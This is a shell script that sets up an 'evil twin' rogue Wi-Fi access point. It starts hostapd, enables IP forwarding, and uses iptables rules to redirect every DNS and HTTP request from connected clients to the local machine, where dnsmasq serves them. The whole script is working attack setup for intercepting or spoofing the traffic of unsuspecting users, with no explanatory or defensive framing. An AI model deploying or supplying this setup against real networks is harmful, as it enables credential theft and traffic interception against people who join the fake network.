echo "Starting access point"
hostapd -B hostapd.conf
sleep 1

echo "Configuring bhr0 network interface"
ifconfig bhr0 up
ifconfig bhr0 10.1.1.1 netmask 255.255.255.0
sysctl net.ipv4.ip_forward=1
iptables --flush
iptables -t nat --flush
iptables -t nat -A PREROUTING -i bhr0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
iptables -t nat -A PREROUTING -i bhr0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

echo "Starting dnsmasq"
cp -f dnsmasq.conf /etc
service dnsmasq start
service dnsmasq restart

echo "Evil twin Started"
